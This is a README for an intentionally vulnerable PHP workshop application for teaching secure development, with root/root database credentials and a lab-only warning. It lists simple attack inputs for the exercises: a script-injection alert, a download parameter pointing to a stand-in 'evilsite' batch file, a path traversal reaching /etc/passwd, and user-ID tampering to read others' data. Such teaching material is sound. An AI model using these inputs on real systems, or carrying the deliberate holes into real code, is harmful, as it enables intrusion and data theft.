# skf-workshop
Demo PHP Application with security vulnerabilities, can be used to teach SKF in a workshop

Requirements for this web-application:
- Webserver
  - Tested with Apache2
- PHP5
- Mysql
  - PHP Code uses the Mysql PDO driver
  - user: root
  - password: root
- Database test

Remark:
Do not run this outside a secured LAB environment!


Injections strings, for hands-on(slides)

*Cross site scripting:*
<script> alert(123);</script>

*Reflective file download:*
On the hackme application you can make the download= url make the user download 
a file from another source:
download=http://www.evilsite.com/evil.bat

*Directory/path traversal*
On the about page you can tamper the param= which allows you to do a directory traversal:
../../../../etc/passwd

*Idenentifier injection* 
Whenever the user is loggedin into the application you can now tamper the userID=
parameter and steal other users data.





